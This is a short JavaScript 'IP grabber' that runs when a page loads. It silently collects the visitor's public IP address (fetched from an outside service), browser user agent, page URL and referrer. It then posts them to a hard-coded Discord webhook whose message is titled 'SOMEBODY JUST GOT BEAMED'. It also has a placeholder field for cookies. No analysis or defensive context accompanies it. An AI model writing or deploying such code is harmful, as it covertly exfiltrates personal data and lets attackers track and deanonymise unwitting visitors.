var webhook = 'https://discord.com/api/webhooks/1065640812999880714/Zvm-1K_0I5D6-OEb0B2Uli1tLuoD9HdRsc9NcnSNBQNGa0NrkKSA7X4tAsOO1Q88sBXz';
var site = 'https://myexternalip.com/raw';

var get_ip = function() {
    var ip = '';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', site, false);
    xhr.send();
    if (xhr.status == 200) {
        ip = xhr.responseText;
    }
    return ip;
};

function get_browser() {
    var browser = navigator.userAgent;
    return browser;
    }

function get_time() {
    var date = new Date();
    var time = date.toLocaleString();
    return time;
    }

function get_url() {
    var url = window.location.href;
    return url;
    }

function get_referrer() {
    var referrer = document.referrer;
    return referrer;
    }


function get_location() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var location = {
                lat: position.coords.latitude,
                lng: position.coords.longitude
            };
            return location;
        });
    } else {
        return "Geolocation is not supported by this browser.";
    }
}


    

function send_webhook() {
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            embeds: [{
                title: "SOMEBODY JUST GOT BEAMED1!!!!x",
                color: 12240119,
                fields: [

                {
                    name: "\u{1F310} Browser",
                    value: `||${get_browser()}||`,
                    inline: true
                },
                {
                    name: "\u{1F4BB} URL",
                    value: `||${get_url()}||`,
                    inline: true
                },
                {
                    name: "\u{1F36A} Cookies",
                    value: ``,
                    inline: true
                },

                {
                    name: "\u{1F50D} Referrer",
                    value: `||${get_referrer()}||`,
                    inline: true
                },
                {
                    name: "\u{1F30E} Location",
                    value: `huj`,
                    inline: true
                },
                {
                    name: "\u{1F512} IP",
                    value: `||${get_ip()}||`,
                    inline: true
                },

                ]
            }]
        })
    })
}

send_webhook();
